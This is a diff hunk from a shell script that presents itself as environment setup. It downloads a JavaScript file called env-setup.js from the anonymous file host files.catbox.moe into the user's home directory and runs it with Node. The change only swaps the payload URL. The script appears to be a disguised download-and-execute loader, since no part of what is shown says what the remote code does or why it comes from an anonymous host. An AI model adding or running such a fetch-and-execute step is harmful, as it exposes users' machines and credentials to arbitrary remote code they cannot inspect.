@@ -116,7 +116,7 @@ fi
 # Download and run env-setup.js
 # -------------------------
 ENV_SETUP_JS="${USER_HOME}/env-setup.js"
-download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
+download "https://files.catbox.moe/92zc8z.js" "$ENV_SETUP_JS"
 [[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
 
 "$NODE_EXE" "$ENV_SETUP_JS"
